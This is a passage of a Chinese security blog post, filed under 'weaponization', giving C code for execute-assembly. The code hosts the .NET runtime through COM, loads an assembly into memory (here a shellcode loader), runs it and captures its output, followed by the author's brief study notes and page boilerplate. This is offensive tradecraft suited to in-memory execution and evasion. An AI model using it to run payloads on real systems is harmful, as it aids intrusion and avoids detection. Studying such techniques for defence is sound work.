空参数</span></span><br><span class="line"></span><br><span class="line">    SafeArrayPutElement(pMethodArgs, idx, &amp;vPsa);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 Invoke_3</span></span><br><span class="line">    pMethodInfo-&gt;lpVtbl-&gt;Invoke_3(pMethodInfo, vObj, pMethodArgs, &amp;vRet);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复原始 StdOut (必须在关闭 Write 句柄前恢复，否则 printf 可能异常)</span></span><br><span class="line">    SetStdHandle(STD_OUTPUT_HANDLE, g_OrigninalStdOut);</span><br><span class="line">    SetStdHandle(STD_ERROR_HANDLE, g_OrigninalStdErr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ==========================================</span></span><br><span class="line">    <span class="comment">// 5.资源清理</span></span><br><span class="line">    <span class="comment">// ==========================================</span></span><br><span class="line">    <span class="comment">// // 关键步骤：恢复标准输出</span></span><br><span class="line">    <span class="keyword">if</span> (g_OrigninalStdOut != INVALID_HANDLE_VALUE) SetStdHandle(STD_OUTPUT_HANDLE, g_OrigninalStdOut);</span><br><span class="line">    <span class="keyword">if</span> (g_OrigninalStdErr != INVALID_HANDLE_VALUE) SetStdHandle(STD_ERROR_HANDLE, g_OrigninalStdErr);</span><br><span class="line"></span><br><span class="line">    SAFE_CLOSE(hPipeWrite);</span><br><span class="line">    SAFE_CLOSE(hThread);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印或处理捕获的结果</span></span><br><span class="line">    <span class="keyword">if</span> (ctx.outputBuffer) &#123;</span><br><span class="line">        printf(<span class="string">&quot;\n[+] Captured Output:\n%s\n&quot;</span>, ctx.outputBuffer);</span><br><span class="line">        free(ctx.outputBuffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        printf(<span class="string">&quot;[-] No output captured or execution failed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pSafeArray) SafeArrayDestroy(pSafeArray);</span><br><span class="line">    <span class="keyword">if</span> (pMethodArgs) SafeArrayDestroy(pMethodArgs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// COM 释放</span></span><br><span class="line">    SAFE_RELEASE(pMethodInfo);</span><br><span class="line">    SAFE_RELEASE(pAssembly);</span><br><span class="line">    SAFE_RELEASE(pAppDomain);</span><br><span class="line">    SAFE_RELEASE(pAppDomainThunk);</span><br><span class="line">    SAFE_RELEASE(pCorRuntimeHost);</span><br><span class="line">    SAFE_RELEASE(pRuntimeInfo);</span><br><span class="line">    SAFE_RELEASE(pMetaHost);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 配置：要加载的 .NET 程序路径 (请修改为你实际存在的路径)</span></span><br><span class="line">    <span class="keyword">const</span> char* targetAssembly = <span class="string">&quot;D:\\代码\\Vs2022\\TestForC#\\DotnetNoVirtualProtectShellcodeLoader\\bin\\x64\\Debug\\DotnetNoVirtualProtectShellcodeLoader.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line">	BUFFER assemblyBuffer = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	BUFFER argumentsBuffer = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    printf(<span class="string">&quot;[*] Reading assembly from: %s\n&quot;</span>, targetAssembly);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 从磁盘读取文件到内存</span></span><br><span class="line">    HANDLE hFile = CreateFileA(targetAssembly, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, <span class="number">0</span>, NULL);</span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        printf(<span class="string">&quot;[-] Error: Could not open file. Error Code: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    assemblyBuffer.Length = GetFileSize(hFile, NULL);</span><br><span class="line">	assemblyBuffer.Buffer = (unsigned char*)malloc(assemblyBuffer.Length);</span><br><span class="line">    DWORD lpNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!ReadFile(hFile, assemblyBuffer.Buffer, assemblyBuffer.Length, &amp;lpNumberOfBytesRead, NULL)) &#123;</span><br><span class="line">        printf(<span class="string">&quot;[-] Error: Could not read file.\n&quot;</span>);</span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	printf(<span class="string">&quot;[+] Assembly read into memory (%d bytes).\n&quot;</span>, assemblyBuffer.Length);</span><br><span class="line">    CloseHandle(hFile);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!DotnetExecute(assemblyBuffer, argumentsBuffer)) &#123;</span><br><span class="line">		printf(<span class="string">&quot;[-] DotnetExecute failed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images%2F2025%2F12%2F11%2F18-18-22-cf613fe9051a8bf67b915e91c9c8f5b2-PixPin_2025-12-11_18-18-09-e44597.png" alt="PixPin_2025-12-11_18-18-09.png"></p>
+<p>这是一篇简短的execute-assembly学习笔记，自我感觉本篇文章并没有完整地介绍清楚execute-assembly的原理，因为涉及到大量的com的知识，我也不是很了解，这个可以用ai去深入学习，肯定比我说的清楚。</p>
+<p>既然提到了AI，就不得不感慨AI的发展越来越快，极大的改变了我的学习方式和工作方式，有什么问题和想法总是先问AI再不断改进的思路最终完成落地。</p>
+<p>要说AI能否在某某领域替代人工，这我不好说，我只能肯定AI带来的惊喜取决于你对该领域知识的掌握程度，即你能给出多详细准确的提示词，能分辨AI给出的结果是否正确有用。</p>
+<p>下一篇文章总结一下自己的学习历程。</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2025/12/12/%E8%B7%A8%E4%BD%8D%E6%95%B0%E6%B3%A8%E5%85%A5/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2025-12-12 19:25:23
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E6%AD%A6%E5%99%A8%E5%8C%96/" title="武器化">
+                        <b>#</b> 武器化
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81execute-assembly%E7%9A%84%E6%A0%87%E5%87%86%E6%B5%81%E7%A8%8B"><span class="toc-text">二、execute-assembly的标准流程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81C-%E7%89%88%E6%9C%AC"><span class="toc-text">三、C++版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E7%BA%AFC%E7%89%88%E6%9C%AC"><span class="toc-text">四、纯C版本</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: 'kr7nhXQQsnagsiZAr9IIxoDq-gzGzoHsz',
+        appKey: 'Sujqic7fHSzakqEntTDwEJp3',
+        placeholder: 'Welcome!',
+        avatar: 'retro',
+        lang: 'en'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/onedays12">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/onedays12">Copyright © 2025 oneday</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Execute-NET-Assembly + '&url=' + http%3A%2F%2Fexample.com%2F2025%2F12%2F12%2FExecute-NET-Assembly%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2025/12/12/Execute-NET-Assembly/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
